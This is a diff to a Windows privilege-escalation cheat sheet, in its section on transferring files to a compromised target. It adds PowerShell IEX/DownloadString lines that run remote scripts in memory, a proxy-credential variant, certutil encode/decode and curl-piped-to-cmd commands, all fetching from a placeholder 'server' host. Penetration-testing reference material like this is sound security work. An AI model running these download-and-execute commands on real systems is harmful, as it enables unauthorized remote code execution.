@@ -449,23 +449,37 @@ I've created a Powershell script which pretty much automates all of the above. Y
 
 At some point during privilege escalation you will need to get files onto your target. Below are some easy ways to do so.
 
-Powershell Cmdlet (Powershell 3.0 and higher)
+PowerShell Cmdlet (Powershell 3.0 and higher)
 
 ```powershell
-Invoke-WebRequest "https://myserver/filename" -OutFile "C:\Windows\Temp\filename"
+Invoke-WebRequest "https://server/filename" -OutFile "C:\Windows\Temp\filename"
 ```
 
-Powershell One-Liner 
+PowerShell One-Liner 
 
 ```powershell
-(New-Object System.Net.WebClient).DownloadFile("https://myserver/filename", "C:\Windows\Temp\filename") 
+(New-Object System.Net.WebClient).DownloadFile("https://server/filename", "C:\Windows\Temp\filename") 
 ```
 
-Powershell Script
+PowerShell One-Line Script Execution in Memory
+
+```powershell
+IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')
+```
+
+PowerShell with Proxy
+
+```powershell
+$browser = New-Object System.Net.WebClient;
+$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
+IEX($browser.DownloadString('https://server/script.ps1'));
+```
+
+PowerShell Script
 
 ```powershell
 echo $webclient = New-Object System.Net.WebClient >>wget.ps1
-echo $url = "http://IPADDRESS/file.exe" >>wget.ps1
+echo $url = "http://server/file.exe" >>wget.ps1
 echo $file = "output-file.exe" >>wget.ps1
 echo $webclient.DownloadFile($url,$file) >>wget.ps1
 		
@@ -491,7 +505,25 @@ CertUtil
 certutil.exe -urlcache -split -f https://myserver/filename outputfilename
 ```
 
+Certutil can also be used for base64 encoding/decoding.
 
+```
+certutil.exe -encode inputFileName encodedOutputFileName
+certutil.exe -decode encodedInputFileName decodedOutputFileName
+```
+
+Starting with Windows 10 1803 (April 2018 Update) the `curl` command has been implemented which gives another way to transfer files and even execute them in memory. _Piping directly into cmd will run most things but it seems like if you have anything other than regular commands in your script, ie loops, if statements etc, it doesn't run them correctly._
+
+```
+curl http://server/file -o file
+curl http://server/file.bat | cmd
+```
+
+And with PowerShell
+
+```powershell
+IEX(curl http://server/script.ps1);Invoke-Blah
+```
 
 ## Port Forwarding
 
